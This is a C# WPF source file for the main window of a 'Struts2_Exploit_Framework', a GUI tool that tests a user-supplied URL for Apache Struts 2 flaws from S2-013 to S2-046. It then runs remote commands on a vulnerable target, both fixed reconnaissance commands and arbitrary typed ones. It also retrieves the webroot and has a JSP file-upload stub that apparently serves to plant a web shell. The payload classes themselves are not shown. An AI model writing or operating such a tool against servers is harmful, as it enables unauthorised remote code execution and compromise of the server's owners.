using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using Microsoft.Win32;
using Struts2_Exploit_Framework.Attack;

namespace Struts2_Exploit_Framework
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        Attack.S2_013 aV13 = null;
        Attack.S2_016 aV16 = null;
        Attack.S2_019 aV19 = null;
        Attack.S2_032 aV32 = null;
        Attack.S2_033 aV33 = null;
        Attack.S2_037 aV37 = null;
        Attack.S2_045 aV45 = null;
        Attack.S2_046 aV46 = null;
        int activeVul = -1;

        private static string GetActiveVulStr(int vulIndex)
        {
            if (vulIndex == 0) return "S2-013";
            else if (vulIndex == 1) return "S2-016";
            else if (vulIndex == 2) return "S2-019";
            else if (vulIndex == 3) return "S2-032";
            else if (vulIndex == 4) return "S2-033";
            else if (vulIndex == 5) return "S2-037";
            else if (vulIndex == 6) return "S2-045";
            else if (vulIndex == 7) return "S2-046";
            else return "Error";
        }

        private void TestButton_Click(object sender, RoutedEventArgs e)
        {
            string tgtUrl = URLBox.Text;
            int vulIndex = VulCombo.SelectedIndex;
            activeVul = vulIndex;
            InfoBox.Text += "-------------------------\n";
            bool isVul = false;
            if (vulIndex == 0)
            {
                aV13 = new Attack.S2_013(tgtUrl);
                isVul = aV13.CheckVul();
            }
            else if (vulIndex == 1)
            {
                aV16 = new Attack.S2_016(tgtUrl);
                isVul = aV16.CheckVul();
            }
            else if (vulIndex == 2)
            {
                aV19 = new Attack.S2_019(tgtUrl);
                isVul = aV19.CheckVul();
            }
            else if (vulIndex == 3)
            {
                aV32 = new Attack.S2_032(tgtUrl);
                isVul = aV32.CheckVul();
            }
            else if (vulIndex == 4)
            {
                aV33 = new Attack.S2_033(tgtUrl);
                isVul = aV33.CheckVul();
            }
            else if (vulIndex == 5)
            {
                aV37 = new Attack.S2_037(tgtUrl);
                isVul = aV37.CheckVul();
            }
            else if (vulIndex == 6)
            {
                aV45 = new Attack.S2_045(tgtUrl);
                isVul = aV45.CheckVul();
            }
            else if (vulIndex == 7)
            {
                aV46 = new Attack.S2_046(tgtUrl);
                isVul = aV46.CheckVul();
            }
            if (isVul)
            {
                InfoBox.Text += GetActiveVulStr(activeVul) + ": 漏洞可用\n\n";
            }
            else
            {
                InfoBox.Text += GetActiveVulStr(activeVul) + ": 漏洞不可用\n\n";
            }
        }

        private void InfoExeButton_Click(object sender, RoutedEventArgs e)
        {
            string retString = "";
            if ((bool)WinSysinfo.IsChecked)
            {
                InfoBox.Text += "-------------------------\n";
                InfoBox.Text += "Systeminfo (Windows CMD):\n";
                if (activeVul == 0)
                {
                    retString = aV13.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 1)
                {
                    retString = aV16.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 2)
                {
                    retString = aV19.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 3)
                {
                    retString = aV32.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 4)
                {
                    retString = aV33.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 5)
                {
                    retString = aV37.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 6)
                {
                    retString = aV45.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 7)
                {
                    retString = aV46.ExecuteCommand("systeminfo");
                    InfoBox.Text += retString + '\n';
                }
            }
            else if ((bool)LiUname.IsChecked)
            {
                InfoBox.Text += "-------------------------\n";
                InfoBox.Text += "Linux uname -a :\n";
                if (activeVul == 0)
                {
                    retString = aV13.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 1)
                {
                    retString = aV16.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 2)
                {
                    retString = aV19.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 3)
                {
                    retString = aV32.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 4)
                {
                    retString = aV33.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 5)
                {
                    retString = aV37.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 6)
                {
                    retString = aV45.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 7)
                {
                    retString = aV46.ExecuteCommand("uname -a");
                    InfoBox.Text += retString + '\n';
                }
            }
            else if ((bool)LiLsb.IsChecked)
            {
                InfoBox.Text += "-------------------------\n";
                InfoBox.Text += "Linux lsb_release :\n";
                if (activeVul == 0)
                {
                    retString = aV13.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 1)
                {
                    retString = aV16.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 2)
                {
                    retString = aV19.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 3)
                {
                    retString = aV32.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 4)
                {
                    retString = aV33.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 5)
                {
                    retString = aV37.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 6)
                {
                    retString = aV45.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 7)
                {
                    retString = aV46.ExecuteCommand("cat /etc/issue");
                    InfoBox.Text += retString + '\n';
                }
            }
            else if ((bool)WebRoot.IsChecked)
            {
                InfoBox.Text += "-------------------------\n";
                InfoBox.Text += "Webroot :\n";
                if (activeVul == 0)
                {
                    retString = aV13.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 1)
                {
                    retString = aV16.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 2)
                {
                    retString = aV19.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 3)
                {
                    retString = aV32.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 4)
                {
                    retString = aV33.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 5)
                {
                    retString = aV37.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 6)
                {
                    retString = aV45.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
                else if (activeVul == 7)
                {
                    retString = aV46.GetWebRoot();
                    InfoBox.Text += retString + '\n';
                }
            }
        }

        private void CmdButton_Click(object sender, RoutedEventArgs e)
        {
            string cmdlet = CmdBox.Text.Trim();
            CmdInfoBox.Text += "\n";
            CmdInfoBox.Text += "$>"+cmdlet+"\n";
            string retString = "";
            if (activeVul == 0)
            {
                retString = aV13.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 1)
            {
                retString = aV16.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 2)
            {
                retString = aV19.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 3)
            {
                retString = aV32.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 4)
            {
                retString = aV33.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 5)
            {
                retString = aV37.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 6)
            {
                retString = aV45.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
            else if (activeVul == 7)
            {
                retString = aV46.ExecuteCommand(cmdlet);
                CmdInfoBox.Text += retString + '\n';
            }
        }

        private void FileButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog odf = new OpenFileDialog();
            odf.Filter = "Java Server Pages(*.jsp)|*.jsp|文本文件(*.txt)|*.txt|所有文件(*.*)|*.*";
            odf.ShowDialog();
            UploadBox.Text = odf.FileName;
            if (UploadBox.Text != "")
            {
                StreamReader file = new StreamReader(UploadBox.Text);
                UploadInfoBox.Text = file.ReadToEnd();
                file.Close();
            }
        }

        private void UploadButton_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("上传成功!", "Struts 2 漏洞综合利用工具", MessageBoxButton.OK, MessageBoxImage.Information);
        }
    }
}
